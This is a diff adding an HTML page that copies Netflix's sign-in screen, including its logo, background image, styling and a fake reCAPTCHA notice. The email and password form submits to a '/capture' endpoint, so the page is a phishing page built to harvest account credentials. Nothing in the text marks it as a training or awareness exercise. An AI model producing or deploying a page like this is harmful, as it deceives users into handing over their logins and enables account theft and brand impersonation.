@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Netflix Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
+        
+        body {
+            min-height: 100vh;
+            position: relative;
+            background: #000;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), 
+                        url('https://assets.nflxext.com/ffe/siteui/vlv3/5f8f58f3-7a3a-4f5f-9b88-3c1f6c9e8e0c/IN-en-20240129-popsignuptwoweeks-perspective_alpha_website_large.jpg');
+            background-size: cover;
+            background-position: center;
+            z-index: -1;
+        }
+        
+        header {
+            padding: 24px 4%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo { width: 148px; }
+        
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 100px);
+            padding: 20px;
+        }
+        
+        .form-box {
+            background: rgba(0,0,0,0.75);
+            padding: 60px 68px 40px;
+            border-radius: 4px;
+            width: 100%;
+            max-width: 450px;
+        }
+        
+        h1 {
+            color: #fff;
+            font-size: 32px;
+            font-weight: 500;
+            margin-bottom: 28px;
+        }
+        
+        input {
+            width: 100%;
+            background: #333;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            height: 50px;
+            padding: 16px 20px;
+            margin-bottom: 16px;
+            font-size: 16px;
+        }
+        input:focus { outline: none; background: #454545; }
+        
+        .signin-btn {
+            width: 100%;
+            background: #e50914;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            height: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 24px;
+        }
+        .signin-btn:hover { background: #f40612; }
+        
+        .help {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 12px;
+            color: #b3b3b3;
+            font-size: 13px;
+        }
+        
+        .remember { display: flex; align-items: center; gap: 5px; }
+        .remember input { width: auto; height: auto; margin: 0; }
+        
+        .help a { color: #b3b3b3; text-decoration: none; }
+        .help a:hover { text-decoration: underline; }
+        
+        .signup {
+            color: #737373;
+            margin-top: 70px;
+            font-size: 16px;
+        }
+        .signup a { color: #fff; text-decoration: none; }
+        .signup a:hover { text-decoration: underline; }
+        
+        .recaptcha {
+            color: #8c8c8c;
+            font-size: 13px;
+            margin-top: 20px;
+        }
+        .recaptcha a { color: #0071eb; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <header>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="logo" alt="Netflix">
+    </header>
+    
+    <div class="container">
+        <div class="form-box">
+            <h1>Sign In</h1>
+            <form action="/capture" method="POST">
+                <input type="text" name="email" placeholder="Email or phone number" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit" class="signin-btn">Sign In</button>
+            </form>
+            
+            <div class="help">
+                <label class="remember"><input type="checkbox"> Remember me</label>
+                <a href="#">Need help?</a>
+            </div>
+            
+            <div class="signup">
+                New to Netflix? <a href="#">Sign up now</a>
+            </div>
+            
+            <p class="recaptcha">
+                This page is protected by Google reCAPTCHA to ensure you're not a bot. 
+                <a href="#">Learn more</a>.
+            </p>
+        </div>
+    </div>
+</body>
+</html>
